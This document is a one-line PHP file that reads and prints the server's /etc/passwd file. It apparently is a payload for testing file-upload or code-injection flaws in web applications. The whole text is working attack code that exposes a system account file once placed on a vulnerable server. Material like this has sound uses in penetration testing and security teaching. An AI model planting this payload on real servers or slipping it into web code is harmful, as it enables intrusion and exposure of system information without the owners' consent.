<?php readfile("/etc/passwd"); ?>
